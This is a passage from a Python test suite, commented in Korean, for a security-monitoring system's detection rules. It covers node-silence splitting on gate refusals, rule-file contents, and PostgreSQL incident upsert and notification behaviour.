    """i2 R301: 같은 노드의 관문 거부 시각으로 적재 공백을 쪼갠다 (params.split_on_gate_reject)."""

    GAP = [("web-01", at(0), at(31), 31)]
    I1_DETAIL = {"_target": "node:web-01", "_end": at(31), "last_receipt": at(0).isoformat(),
                 "alive_minutes": 31, "threshold_seconds": 600, "ongoing": False}

    def rule(self, **params):
        doc, rule = rule_of("rules_infra.json", "R301")
        rule = copy.deepcopy(rule)
        rule["params"].update(params)
        return doc, rule

    def test_조각_질의와_인자(self):
        doc, rule = self.rule()
        p = rule["params"]
        cur = FakeCursor(split_answer([("web-01", at(0), at(31), 31), ("fw", at(50), None, 12)], [(1860.0, 0, 31)]))
        rule = copy.deepcopy(rule)
        rule["params"]["_version"] = doc["rule_version"]
        detect.signals_node_silence(cur, rule, SINCE, UNTIL)
        [(_, main_prm), (sql1, prm1), (sql2, prm2)] = cur.log
        self.assertEqual(main_prm, [UNTIL, 600, SINCE, UNTIL])       # 주 질의는 i1 과 같다
        self.assertEqual((sql1, sql2), (detect.GATE_SPLIT_SQL, detect.GATE_SPLIT_SQL))
        self.assertEqual(prm1, [at(0), at(31), UNTIL, "web-01", "/loki/api/v1/push", PAIR_EIDS, PAIR_REASONS, 600])
        self.assertEqual(prm2, [at(50), None, UNTIL, "fw", "/loki/api/v1/push", PAIR_EIDS, PAIR_REASONS, 600])  # 진행 중
        self.assertEqual(list(zip(PAIR_EIDS, PAIR_REASONS)),
                         [(e, r) for e, rs in p["gate_reject_reasons"].items() for r in rs])
        self.assertEqual(sql1.count("%s"), len(prm1))
        for part in ("coalesce(%s::timestamptz, least(%s::timestamptz, now())) AS hi",
                     "JOIN nodes n ON n.node_id = %s",
                     "e.provenance = 'real' AND e.sensor = 'collector' AND e.url = %s",
                     "e.username = n.node_id AND host(e.src_ip) = host(n.addr) AND e.ts >= n.registered_at",
                     "e.ts > w.lo AND e.ts < w.hi",
                     "(e.eventid, substring(e.input from '^reason=([a-z_]+) ')) IN "
                     "(SELECT k.eid, k.reason FROM unnest(%s::text[], %s::text[]) AS k(eid, reason))",
                     "lead(ts) OVER (ORDER BY ts)",
                     "CASE WHEN c.b - c.a > make_interval(secs => %s) THEN "
                     "(SELECT count(DISTINCT date_trunc('minute', d.started_at)) FROM detector_runs d "
                     "WHERE d.started_at >= c.a AND d.started_at < c.b) END"):
            self.assertIn(part, sql1)

    def test_조각이_모두_임계_이하면_신호_없음(self):
        # 9/21: 31분 공백 안에 1분마다 관문 거부 30건. 가장 긴 조각 61초
        doc, rule = self.rule()
        pieces = [(61.1, 30, None)] + [(60.0, 30, None)] * 29 + [(58.0, 30, None)]
        self.assertEqual(signals_of(doc, rule, split_answer(self.GAP, pieces)), [])

    def test_임계를_넘는_조각이_남으면_신호(self):
        doc, rule = self.rule()
        pieces = [(61.0, 2, None), (1500.0, 2, 25), (299.0, 2, None)]
        sig = signals_of(doc, rule, split_answer(self.GAP, pieces))
        self.assertEqual(sig, [(at(0), None, None, dict(self.I1_DETAIL, gate_refusals=2,
                                                         longest_uncovered_seconds=1500.0))])

    def test_공백_전체가_상한을_넘으면_조각과_상관없이_신호(self):
        # 노드가 인정된 사유(busy)를 스스로 만들어 1분마다 쪼개도, 공백이 1시간을 넘으면 뜬다
        doc, rule = self.rule()
        gap = [("web-01", at(0), at(61), 61)]
        pieces = [(60.0, 60, None)] * 61
        [sig] = signals_of(doc, rule, split_answer(gap, pieces))
        self.assertEqual(sig[3], dict(self.I1_DETAIL, _end=at(61), alive_minutes=61, gate_refusals=60,
                                      longest_uncovered_seconds=60.0, split_capped=True))
        # 상한과 같으면 넘지 않은 것이다. 그때는 조각의 잣대를 그대로 댄다
        self.assertEqual(signals_of(doc, rule, split_answer(gap, [(60.0, 59, None)] * 60)), [])

    def test_넘는_조각에서_관제가_멈췄으면_신호_없음(self):
        # 관문이 거부하다가 data-01 이 함께 멈춘 뒤로 이어진 공백. 넘는 조각에 i1 과 같은 잣대를 댄다
        doc, rule = self.rule()
        self.assertEqual(signals_of(doc, rule, split_answer(self.GAP, [(120.0, 1, None), (1740.0, 1, 7)])), [])
        sig = signals_of(doc, rule, split_answer(self.GAP, [(120.0, 1, None), (1740.0, 1, 8)]))
        self.assertEqual(len(sig), 1)

    def test_거부가_없으면_i1_과_같다(self):
        # 9/22: 158분 공백, 거부 0건. 조각은 공백 하나뿐이고 그 조각의 관제 분은 공백 전체의 값과 같다
        doc, rule = self.rule()
        i1_doc, i1_rule = infra_as_i1()
        [old] = signals_of(i1_doc, i1_rule, split_answer(self.GAP, []))
        [new] = signals_of(doc, rule, split_answer(self.GAP, [(1860.0, 0, 31)]))
        self.assertEqual(old, (at(0), None, None, self.I1_DETAIL))
        self.assertEqual(new[:3], old[:3])
        self.assertEqual(new[3], dict(old[3], gate_refusals=0, longest_uncovered_seconds=1860.0))

    def test_조각_결과가_비면_그대로_낸다(self):
        doc, rule = self.rule()
        [sig] = signals_of(doc, rule, split_answer(self.GAP, []))
        self.assertEqual(sig[3], dict(self.I1_DETAIL, gate_refusals=0, longest_uncovered_seconds=0.0))

    def test_걸러진_공백은_조각_질의를_하지_않는다(self):
        doc, rule = self.rule()
        cur = FakeCursor(split_answer([("web-01", at(0), at(40), 0), ("fw", at(0), at(12), 7)], [(1.0, 0, 99)]))
        rule = copy.deepcopy(rule)
        rule["params"]["_version"] = doc["rule_version"]
        self.assertEqual(detect.signals_node_silence(cur, rule, None, None), [])
        self.assertEqual(len(cur.log), 1)

    def test_끄면_i1_문장_하나만(self):
        doc, rule = self.rule(split_on_gate_reject=False)
        [(sql, prm)] = collect(doc, rule)
        self.assertEqual(prm, [None, 600])
        [sig] = signals_of(doc, rule, split_answer(self.GAP, [(1.0, 5, None)]))
        self.assertEqual(sig[3], self.I1_DETAIL)

    def test_형식이_틀리면_규칙_오류(self):
        for params in ({"split_on_gate_reject": "true"}, {"split_on_gate_reject": 1},
                       {"gate_reject_eventids": ["collector.agent.throttled"]},     # 예전 꼴
                       {"gate_reject_reasons": {}}, {"gate_reject_reasons": ["busy"]},
                       {"gate_reject_reasons": {"": ["busy"]}},
                       {"gate_reject_reasons": {"collector.agent.throttled": []}},
                       {"gate_reject_reasons": {"collector.agent.throttled": "busy"}},
                       {"gate_reject_reasons": {"collector.agent.throttled": ["Busy"]}},
                       {"gate_reject_reasons": {"collector.agent.throttled": ["busy count"]}},
                       {"gate_reject_reasons": {"collector.agent.throttled": [None]}},
                       {"split_max_gap_seconds": 600}, {"split_max_gap_seconds": "3600"},
                       {"split_max_gap_seconds": True}, {"split_max_gap_seconds": 3600.0}):
            with self.subTest(params=params):
                doc, rule = self.rule(**params)
                with self.assertRaises(ValueError):
                    collect(doc, rule)
        for key in ("gate_reject_reasons", "split_max_gap_seconds"):
            with self.subTest(missing=key):
                doc, rule = self.rule()
                rule["params"].pop(key)
                with self.assertRaises(ValueError):
                    collect(doc, rule)

    def test_관문_파서와_값이_맞는다(self):
        """경로 · eventid · 사유는 관문(collector/gate.py)이 쓰는 값이고, 사유는 파서가 만든 input 앞머리에서 뽑힌다."""
        import importlib.util
        root = os.path.dirname(HERE)

        def module(rel, name):
            spec = importlib.util.spec_from_file_location(name, os.path.join(root, rel))
            m = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(m)
            return m

        import inspect
        gate = module("collector/gate.py", "_gate_for_test")
        agent = module("parser/parse_agent.py", "_parse_agent_for_test")
        [handler] = [c for c in vars(gate).values() if inspect.isclass(c) and "_push" in vars(c)]
        push_src = inspect.getsource(handler._push)
        _, rule = self.rule()
        p = rule["params"]
        self.assertEqual(detect.GATE_PUSH_PATH, gate.PUSH)
        self.assertEqual(set(p["gate_reject_reasons"]), {gate.REJECTED, gate.THROTTLED})
        # 지금 관문의 제한 줄은 busy 만. 415(content_*) · client_gone 은 노드가 헤더 · 연결로 만들 수 있다
        self.assertEqual(p["gate_reject_reasons"][gate.THROTTLED], ["busy"])
        for reason in ("content_encoding", "content_type", "client_gone"):
            self.assertIn(f'"{reason}"', push_src)
            self.assertNotIn(reason, p["gate_reject_reasons"][gate.THROTTLED])
        for reason in {r for rs in p["gate_reject_reasons"].values() for r in rs}:
            with self.subTest(reason=reason):
                self.assertIn(f'"{reason}"', push_src)       # 인증을 통과한 밀어넣기에서 관문이 남기는 사유
        # 관문 원장 한 줄(Ledger._write 모양) → 파서 → input. SQL 의 사유 식과 같은 정규식으로 뽑는다
        line = json.dumps({"ts": "2026-09-21T13:30:01.000000+00:00", "boot": "a1b2c3", "seq": 7,
                           "eventid": gate.THROTTLED, "src_ip": "192.168.50.21", "dst_port": 3101,
                           "path": gate.PUSH, "reason": "content_encoding", "count": 3, "distinct_fp": 1,
                           "fps": ["0a1b2c3d"], "ua": "Alloy/v1.10", "node_id": "web-01"})
        kind, row = agent.parse_collector(line)
        self.assertEqual(kind, "event")
        self.assertEqual((row["username"], row["url"], row["sensor"], row["provenance"]),
                         ("web-01", gate.PUSH, "collector", "real"))
        self.assertIn("substring(e.input from '^reason=([a-z_]+) ')", detect.GATE_SPLIT_SQL)
        self.assertEqual(re.match(r"^reason=([a-z_]+) ", row["input"]).group(1), "content_encoding")

    def test_탐지_역할이_nodes_addr_를_읽는다(self):
        root = os.path.dirname(HERE)
        want = "GRANT SELECT (node_id, status, logs, registered_at, addr) ON nodes TO opsloop_detector;"
        for rel in ("infra/schema.sql", "infra/migrations/20260925_round2.sql"):
            with open(os.path.join(root, rel), encoding="utf-8") as f:
                text = f.read()
            start = text.index("IF EXISTS (SELECT 1 FROM pg_roles WHERE rolname = 'opsloop_detector')")
            block = text[start:text.index("END IF;", start)]
            grants = "\n".join(ln for ln in block.splitlines() if not ln.strip().startswith("--"))
            with self.subTest(file=rel):
                self.assertIn(want, grants)
                self.assertNotIn("token_hash", grants)


@unittest.skipUnless(hasattr(detect.psycopg2, "connect") and os.environ.get("OPSLOOP_TEST_DATABASE_URL"),
                     "PostgreSQL 시험 연결 미지정")
class NodeSilenceDatabaseTest(unittest.TestCase):
    """R301 의 두 질의를 연결 전용 임시 테이블(search_path=pg_temp)에 실제로 돌린다. 운영 테이블은 건드리지 않는다.

    web-01 은 9/21 · 9/22 를 본뜬다. A [10, 41)분: 1분마다 옛 관문의 415 거부(rejected) → 뜨지 않는다.
    B [100, 150)분: 인정하는 거부 0건 → 뜬다. B 에는 조건 하나만 틀린 거부 줄을 종류마다 1분씩 넣어, 어느 조건이
    빠져도 B 가 쪼개져 사라지게 한다. 지금 관문의 415 제한 · client_gone 처럼 노드가 만들 수 있는 줄도 여기 있다.
    B 는 상한(1시간)보다 짧아 상한 없이도 떠야 한다. web-02 는 진행 중 공백(55분) 내내 busy 가 이어져 뜨지
    않고, web-03 은 busy 가 멈춘 뒤 45분 조용해 공백 시작 시각(같은 키)으로 뜬다. web-04 는 busy 가 75분
    이어져 상한을 넘어 뜬다. web-05 는 53분 공백을 지금 관문의 415 제한 줄로 9분마다 가린 경우라 뜬다.
    탐지는 0 ~ 274분 매분 돌았다.
    """
    UNTIL = at(275)
    PUSH = "/loki/api/v1/push"

    def setUp(self):
        self.conn = detect.psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute("""
            CREATE TEMP TABLE nodes (node_id text PRIMARY KEY, status text, logs text[],
                                     registered_at timestamptz, addr inet);
            CREATE TEMP TABLE node_metrics (node_id text, loaded_at timestamptz);
            CREATE TEMP TABLE detector_runs (started_at timestamptz);
            CREATE TEMP TABLE events (ts timestamptz, sensor text, provenance text, eventid text, url text,
                                      username text, src_ip inet, input text);
        """)
        sec = lambda m, s: at(m) + timedelta(seconds=s)
        nodes = [("web-01", "192.168.50.21"), ("web-02", "192.168.50.22"), ("web-03", "192.168.50.23"),
                 ("web-04", "192.168.50.24"), ("web-05", "192.168.50.25")]
        self.cur.executemany("INSERT INTO nodes VALUES (%s, 'active', '{nginx,metrics}', %s, %s)",
                             [(n, at(-60), a) for n, a in nodes])
        self.cur.executemany("INSERT INTO detector_runs VALUES (%s)", [(sec(m, 5),) for m in range(275)])
        loads = [("web-01", m) for m in [*range(0, 11), *range(41, 101), *range(150, 275)]]
        loads += [(n, m) for n in ("web-02", "web-03") for m in range(0, 221)]
        loads += [("web-04", m) for m in range(0, 201)]
        loads += [("web-05", m) for m in [*range(0, 101), *range(153, 275)]]
        self.cur.executemany("INSERT INTO node_metrics VALUES (%s, %s)", [(n, at(m)) for n, m in loads])

        def refusal(m, s, node, addr, reason="content_encoding", eventid="collector.agent.throttled",
                    url=self.PUSH, sensor="collector", provenance="real"):
            return (sec(m, s), sensor, provenance, eventid, url, node, addr, f"reason={reason} count=1 fps=0a1b2c3d")

        ev = []
        for m in range(11, 41):     # A: 9/21 관문은 415 를 거부(rejected)로 남겼다
            ev.append(refusal(m, 2, "web-01", "192.168.50.21", eventid="collector.agent.rejected",
                              reason="content_encoding" if m % 2 else "content_type"))
        for m in range(101, 150):   # B: 조건 하나씩만 틀린 줄
            ev += [refusal(m, 1, None, "192.168.50.21"),                            # 모르는 키 (username 없음)
                   refusal(m, 2, "web-01", "192.168.50.99", reason="addr_mismatch",
                           eventid="collector.agent.rejected"),                     # 다른 곳에서 그 노드의 키
                   refusal(m, 3, "web-01", "192.168.50.99"),                        # 등록 주소가 아님
                   refusal(m, 4, "web-02", "192.168.50.21"),                        # 다른 노드
                   refusal(m, 5, "web-01", "192.168.50.21", reason="daily_quota"),  # 노드 쪽 이상
                   refusal(m, 6, "web-01", "192.168.50.21", reason="content_encoding2"),
                   refusal(m, 7, "web-01", "192.168.50.21", eventid="collector.agent.enrolled"),
                   refusal(m, 8, "web-01", "192.168.50.21", url="/opsloop/v1/enroll"),
                   refusal(m, 9, "web-01", "192.168.50.21", sensor="puller"),
                   refusal(m, 10, "web-01", "192.168.50.21", provenance="test"),
                   refusal(m, 11, "web-01", "192.168.50.21"),                       # 지금 관문의 415 제한
                   refusal(m, 12, "web-01", "192.168.50.21", reason="content_type"),
                   refusal(m, 13, "web-01", "192.168.50.21", reason="client_gone"),
                   refusal(m, 14, "web-01", "192.168.50.21", reason="busy", eventid="collector.agent.rejected")]
        ev += [refusal(m, 2, "web-02", "192.168.50.22", reason="busy") for m in range(221, 275)]
        ev += [refusal(m, 2, "web-03", "192.168.50.23", reason="busy") for m in range(221, 231)]
        ev += [refusal(m, 2, "web-04", "192.168.50.24", reason="busy") for m in range(201, 275)]
        ev += [refusal(m, 2, "web-05", "192.168.50.25") for m in range(109, 153, 9)]
        self.cur.executemany("INSERT INTO events VALUES (%s, %s, %s, %s, %s, %s, %s, %s)", ev)

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def signals(self, **params):
        _, rule = rule_of("rules_infra.json", "R301")
        rule = copy.deepcopy(rule)
        rule["params"].update(params)
        sig = detect.signals_node_silence(self.cur, rule, None, self.UNTIL)
        return [(d["_target"], ts, d.get("gate_refusals"), d.get("longest_uncovered_seconds"), d["ongoing"],
                 d.get("split_capped", False)) for ts, _, _, d in sig]

    def test_9_21_은_억제_9_22_는_유지(self):
        self.assertEqual(self.signals(), [
            ("node:web-01", at(100), 0, 3000.0, False, False),
            ("node:web-03", at(220), 10, 2698.0, True, False),
            ("node:web-04", at(200), 74, 62.0, True, True),
            ("node:web-05", at(100), 0, 3180.0, False, False)])

    def test_노드가_만든_415_제한으로는_가려지지_않는다(self):
        # 고치기 전 i2(사유를 eventid 와 따로 인정, client_gone 포함, 상한 없음)는 web-03 말고 모두 놓쳤다
        _, rule = rule_of("rules_infra.json", "R301")
        rule = copy.deepcopy(rule)
        rule["params"]["gate_reject_reasons"] = {
            e: ["content_encoding", "content_type", "busy", "client_gone"]
            for e in ("collector.agent.throttled", "collector.agent.rejected")}
        rule["params"]["split_max_gap_seconds"] = 10 ** 9
        sig = detect.signals_node_silence(self.cur, rule, None, self.UNTIL)
        self.assertEqual([(d["_target"], ts) for ts, _, _, d in sig], [("node:web-03", at(220))])

    def test_끄면_i1_과_같다(self):
        self.assertEqual([s[:2] for s in self.signals(split_on_gate_reject=False)], [
            ("node:web-01", at(10)), ("node:web-01", at(100)), ("node:web-02", at(220)), ("node:web-03", at(220)),
            ("node:web-04", at(200)), ("node:web-05", at(100))])

    def test_9_21_조각(self):
        _, rule = rule_of("rules_infra.json", "R301")
        p = rule["params"]
        self.cur.execute(detect.GATE_SPLIT_SQL, [at(10), at(41), self.UNTIL, "web-01", detect.GATE_PUSH_PATH,
                                                 PAIR_EIDS, PAIR_REASONS, 600])
        rows = self.cur.fetchall()
        self.assertEqual(len(rows), 31)
        self.assertEqual({r[1] for r in rows}, {30})
        self.assertEqual(max(float(r[0]) for r in rows), 62.0)
        self.assertTrue(all(r[2] is None for r in rows))


class NewRuleFileTest(unittest.TestCase):
    """w2 · a1 · i2 규칙 파일의 내용."""

    def test_w2(self):
        doc = load("rules_w1.json")
        self.assertEqual(doc["rule_version"], "w2")
        self.assertEqual([(r["id"], r["name"], r["severity"], r["type"]) for r in doc["rules"]], [
            ("R101", "웹/인증 반복 실패", "medium", "actor_rate"),
            ("R102", "경로 탐색 (404 반복)", "medium", "actor_rate"),
            ("R103", "침해 후 행위 (웹)", "high", "session_compound"),
            ("R104", "도구 반입", "high", "event_match")])
        r101, r102, r103, r104 = doc["rules"]
        self.assertEqual(r101["params"], {
            "eventids": ["sshd.login.failed", "sshd.login.invalid_user", "console.login.failed",
                         "decoy.login.failed"],
            "window_seconds": 600, "threshold": 5})
        # w2 는 R102 에 메타데이터 제외만 더했다. 나머지 규칙 · 임계치는 w1 그대로다
        self.assertEqual({k: v for k, v in r102["params"].items() if k != "exclude_url_patterns"}, W1_R102_PARAMS)
        self.assertEqual(r102["params"]["exclude_url_patterns"], [
            "^/(robots|security|humans|ads)\\.txt$", "^/sitemap\\.xml$", "^/favicon(\\.ico)?$",
            "^/apple-touch-icon(-[0-9]+x[0-9]+)?(-precomposed)?\\.png$",
            "^/\\.well-known/(security\\.txt|robots\\.txt|change-password|openid-configuration|assetlinks\\.json"
            "|apple-app-site-association)$"])
        self.assertEqual([r["changed_from_w1"].split(".")[0] for r in doc["rules"]],
                         ["없음", "exclude_url_patterns 추가", "없음", "없음"])
        self.assertIn("159.223.46.221", r102["rationale"])
        self.assertEqual((r101["aggregation_gap_seconds"], r102["aggregation_gap_seconds"]), (1200, 1200))
        self.assertEqual(r103["params"], {"expr": "login_success AND command_count > 0", "sensors": ["decoy"]})
        self.assertEqual(r104["params"], {"eventid_like": "%.action.upload", "sensors": ["decoy", "console"]})
        self.assertIn("192.168.50.1", r101["rationale"])          # 위험 3
        self.assertIn("decoy.action.view", r103["rationale"])     # 위험 5
        [(sql, prm)] = collect(doc, r103, SINCE, UNTIL)
        self.assertEqual(prm, [SINCE, UNTIL, ["decoy"]])
        self.assertIn("(login_success AND command_count > 0)", sql)
        [(sql, prm)] = collect(doc, r104)
        self.assertEqual(prm, [["decoy", "console"], "%.action.upload"])

    def test_a1(self):
        doc = load("rules_audit.json")
        [rule] = doc["rules"]
        self.assertEqual((rule["id"], rule["name"], rule["severity"], rule["type"]),
                         ("R201", "차단 대량 해제", "high", "operator_rate"))
        self.assertEqual(rule["params"], {"eventids": ["console.block.released", "console.block.shortened"],
                                          "sensors": ["audit"], "window_seconds": 600, "threshold": 3})
        self.assertNotIn("aggregation_gap_seconds", rule)

    def test_i2(self):
        doc = load("rules_infra.json")
        self.assertEqual(doc["rule_version"], "i2")
        [rule] = doc["rules"]
        self.assertEqual((rule["id"], rule["name"], rule["severity"], rule["type"]),
                         ("R301", "노드 수신 끊김", "high", "node_silence"))
        # i1 의 임계치 · 관제 비율은 그대로이고 쪼개기만 더했다
        self.assertEqual({k: v for k, v in rule["params"].items() if k not in SPLIT_KEYS}, I1_PARAMS)
        self.assertEqual(rule["params"]["split_on_gate_reject"], True)
        self.assertEqual(rule["params"]["gate_reject_reasons"], {
            "collector.agent.rejected": ["content_encoding", "content_type"],
            "collector.agent.throttled": ["busy"]})
        self.assertEqual(rule["params"]["split_max_gap_seconds"], 3600)
        self.assertEqual(rule["aggregation_gap_seconds"], 1800)

    def test_n1_은_그대로(self):
        doc = load("rules_node.json")
        self.assertEqual(doc["rule_version"], "n1")
        self.assertEqual([r["id"] for r in doc["rules"]], ["R101"])

    def test_새_버전은_기존_버전과_겹치지_않는다(self):
        versions = [load(n)["rule_version"] for n in ("rules.json", "rules_v2.json", "rules_self.json",
                                                      "rules_node.json", "rules_w1.json", "rules_audit.json",
                                                      "rules_infra.json", "rules_cve.json")]
        self.assertEqual(len(set(versions)), len(versions))

    def test_기준선_입력이_바뀌지_않는다(self):
        # 감사 이벤트(sensor=audit)는 기준선 발생원 밖이라 v1 · v2 R005 가 세지 않는다
        self.assertEqual(detect.BASELINE_SENSORS, ["cowrie", "decoy", "console"])
        self.assertNotIn("audit", detect.BASELINE_SENSORS)


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class UpsertDatabaseTest(unittest.TestCase):
    """적재 문장을 연결 전용 임시 테이블(search_path=pg_temp)에 실제로 돌린다. 운영 테이블은 건드리지 않는다.

    알림 트리거는 infra/notify.sql 을 그대로 읽어 임시 스키마에 만들고, 채널 이름만 이 시험 전용으로 바꾼다.
    """

    def setUp(self):
        self.conn = psycopg2.connect(os.environ["OPSLOOP_TEST_DATABASE_URL"])
        self.cur = self.conn.cursor()
        self.cur.execute("SET search_path TO pg_temp")
        self.cur.execute("""
            CREATE TEMP TABLE incidents (incident_key text PRIMARY KEY, rule_id text NOT NULL,
                rule_version text NOT NULL, rule_name text, severity text NOT NULL, actor_ip inet,
                first_ts timestamptz NOT NULL, last_ts timestamptz NOT NULL, signal_count integer NOT NULL,
                session_count integer, evidence jsonb, status text NOT NULL DEFAULT 'open',
                created_at timestamptz NOT NULL DEFAULT now(), target text);
            CREATE TEMP TABLE verdicts (id bigserial PRIMARY KEY, incident_key text NOT NULL
                REFERENCES incidents (incident_key) ON DELETE CASCADE, verdict text NOT NULL);
        """)
        self.channel = f"opsloop_test_{os.getpid()}_{id(self)}"
        with open(os.path.join(os.path.dirname(HERE), "infra", "notify.sql"), encoding="utf-8") as f:
            sql = f.read()
        self.cur.execute(sql.replace("notify_incident()", "pg_temp.notify_incident()")
                            .replace("'opsloop_incident'", f"'{self.channel}'"))
        self.cur.execute(f"LISTEN {self.channel}")
        self.cur.execute(keep_judged_sql().replace("incidents_keep_judged()", "pg_temp.incidents_keep_judged()"))
        self.conn.commit()

    def tearDown(self):
        self.conn.rollback()
        self.conn.close()

    def load(self, sql, rows):
        psycopg2.extras.execute_batch(self.cur, sql, rows, page_size=200)
        self.conn.commit()
        self.conn.poll()
        keys = sorted(json.loads(n.payload)["incident_key"] for n in self.conn.notifies)
        self.conn.notifies.clear()
        return keys

    def state(self, key):
        self.cur.execute("""SELECT last_ts, signal_count, session_count, evidence, status, created_at,
                                   xmin::text, target FROM incidents WHERE incident_key = %s""", (key,))
        return self.cur.fetchone()

    @staticmethod
    def row(key, last, n, sess, sample):
        return (key, "R003", "t1", "시험", "high", "192.0.2.8", at(0), at(last), n, sess,
                json.dumps({"sample": sample, "sessions": []}))

    def test_이어지면_키우고_판정된_사건은_두고_알림은_새_사건만(self):
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 10, 2, 1, ["a1"]),
                                                        self.row("B", 10, 2, 1, ["b1"])]), ["A", "B"])
        self.cur.execute("INSERT INTO verdicts (incident_key, verdict) VALUES ('B', 'actionable')")
        self.conn.commit()
        a0, b0 = self.state("A"), self.state("B")

        # 다음 회차: A · B 가 이어지고 C 가 새로 생긴다. 알림은 C 만
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 30, 5, 3, ["a1", "a2"]),
                                                        self.row("B", 30, 5, 3, ["b1", "b2"]),
                                                        self.row("C", 5, 1, 1, ["c1"])]), ["C"])
        a1 = self.state("A")
        self.assertEqual(a1[:4], (at(30), 5, 3, {"sample": ["a1", "a2"], "sessions": []}))
        self.assertEqual((a1[4], a1[5]), (a0[4], a0[5]))           # 상태 · 만든 시각은 그대로
        self.assertEqual(self.state("B"), b0)                      # 판정된 사건은 행 버전(xmin)까지 그대로

        # 범위를 좁혀 다시 돌려도(--until) 끝 시각 · 건수가 줄지 않고, 근거도 잘린 구간 값으로 바뀌지 않는다
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 10, 2, 1, ["a1"])]), [])
        self.assertEqual(self.state("A"), a1)                      # 행 버전(xmin)까지 그대로
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 30, 4, 3, ["a1"])]), [])
        self.assertEqual(self.state("A"), a1)                      # 건수만 작아도 근거는 그대로

        # 끝 시각 · 건수가 기존 이상이면 근거를 바꾼다 (진행 중인 공백의 조각처럼 근거만 자라는 경우)
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 30, 5, 3, ["a1", "a2", "a3"])]), [])
        a2 = self.state("A")
        self.assertEqual(a2[:4], (at(30), 5, 3, {"sample": ["a1", "a2", "a3"], "sessions": []}))

        # 값이 그대로면 행을 새로 쓰지 않는다
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("A", 30, 5, 3, ["a1", "a2", "a3"])]), [])
        self.assertEqual(self.state("A"), a2)

        # 트리거: 판정된 사건의 네 열은 문장이 무엇이든 바뀌지 않는다(0행). 상태는 바뀐다
        self.cur.execute("UPDATE incidents SET evidence = '{}'::jsonb, last_ts = last_ts WHERE incident_key = 'B'")
        self.assertEqual(self.cur.rowcount, 0)
        self.cur.execute("UPDATE incidents SET status = 'resolved' WHERE incident_key = 'B'")
        self.assertEqual(self.cur.rowcount, 1)
        self.conn.commit()
        self.assertEqual(self.state("B")[:4], b0[:4])

    def test_같은_트랜잭션에서_지운_인시던트는_알리지_않는다(self):
        # 억제 · 흡수가 넣은 뒤 같은 트랜잭션에서 지우는 인시던트(v3 전 기간 실행은 회차마다 다시 넣고 지운다)
        psycopg2.extras.execute_batch(self.cur, detect.INSERT_BASE, [self.row("K", 10, 2, 1, ["k"]),
                                                                    self.row("X", 10, 2, 1, ["x"])], page_size=200)
        self.cur.execute("DELETE FROM incidents WHERE incident_key = 'X'")
        self.conn.commit()
        self.conn.poll()
        keys = sorted(json.loads(n.payload)["incident_key"] for n in self.conn.notifies)
        self.conn.notifies.clear()
        self.assertEqual(keys, ["K"])
        # 다음 회차에 X 를 다시 넣고 지워도 알리지 않는다. 남는 새 사건만 알린다
        self.assertEqual(self.load(detect.INSERT_BASE, [self.row("K", 10, 2, 1, ["k"])]), [])
        psycopg2.extras.execute_batch(self.cur, detect.INSERT_BASE, [self.row("X", 10, 2, 1, ["x"]),
                                                                    self.row("Y", 10, 2, 1, ["y"])], page_size=200)
        self.cur.execute("DELETE FROM incidents WHERE incident_key = 'X'")
        self.conn.commit()
        self.conn.poll()
        self.assertEqual([json.loads(n.payload)["incident_key"] for n in self.conn.notifies], ["Y"])

    def test_대상_행도_같은_규칙으로_키운다(self):
        first = self.row("N", 10, 1, 0, ["n1"])[:5] + (None,) + self.row("N", 10, 1, 0, ["n1"])[6:] + ("node:web-01",)
        more = self.row("N", 40, 3, 0, ["n1", "n2"])[:5] + (None,) + self.row("N", 40, 3, 0, ["n1", "n2"])[6:] \
            + ("node:web-01",)
        self.assertEqual(self.load(detect.INSERT_TARGET, [first]), ["N"])
        self.assertEqual(self.load(detect.INSERT_TARGET, [more]), [])
        n = self.state("N")
        self.assertEqual((n[0], n[1], n[3]["sample"], n[7]), (at(40), 3, ["n1", "n2"], "node:web-01"))


@unittest.skipUnless(REAL_PG and os.environ.get("OPSLOOP_TEST_DATABASE_URL"), "PostgreSQL 시험 연결 미지정")
class ConcurrentDatabaseTest(unittest.TestCase):
    """탐지 적재 · 억제와 콘솔의 판정 · 조치가 겹칠 때. 두 연결이 같은 표를 봐야 해서 임시 테이블 대신
    시험 전용 스키마를 만들고 끝에 지운다. 운영 테이블은 건드리지 않는다. 스키마를 못 만들면 건너뛴다.

    콘솔 쪽 순서는 app/main.py 의 add_verdict · add_action 과 triage.record 를 따른다
    (판정 · 조치 INSERT → 인시던트 상태 UPDATE → 커밋).
    """

    def setUp(self):
        url = os.environ["OPSLOOP_TEST_DATABASE_URL"]
        self.schema = f"opsloop_test_{os.getpid()}_{id(self)}"
        self.admin = psycopg2.connect(url)
        cur = self.admin.cursor()
        try:
            cur.execute(f"CREATE SCHEMA {self.schema}")
        except psycopg2.Error as e:
            self.admin.rollback()
            self.admin.close()
            self.skipTest(f"시험 스키마를 만들 수 없습니다: {e}")
        cur.execute(f"SET search_path TO {self.schema}")
        cur.execute("""
            CREATE TABLE incidents (incident_key text PRIMARY KEY, rule_id text NOT NULL,
                rule_version text NOT NULL, rule_name text, severity text NOT NULL, actor_ip inet,
                first_ts timestamptz NOT NULL, last_ts timestamptz NOT NULL, signal_count integer NOT NULL,
                session_count integer, evidence jsonb, status text NOT NULL DEFAULT 'open',
                created_at timestamptz NOT NULL DEFAULT now(), target text);
            CREATE TABLE verdicts (id bigserial PRIMARY KEY, incident_key text NOT NULL
                REFERENCES incidents (incident_key) ON DELETE CASCADE, verdict text NOT NULL);
            CREATE TABLE actions (id bigserial PRIMARY KEY, incident_key text NOT NULL
                REFERENCES incidents (incident_key) ON DELETE CASCADE, action text NOT NULL);
        """)
        cur.execute(keep_judged_sql())
        cur.execute(absorbed_table_sql())
        self.admin.commit()
        self.detector, self.console = self.connect(url), self.connect(url)

    def connect(self, url):
        conn = psycopg2.connect(url)
        cur = conn.cursor()
        cur.execute(f"SET search_path TO {self.schema}")
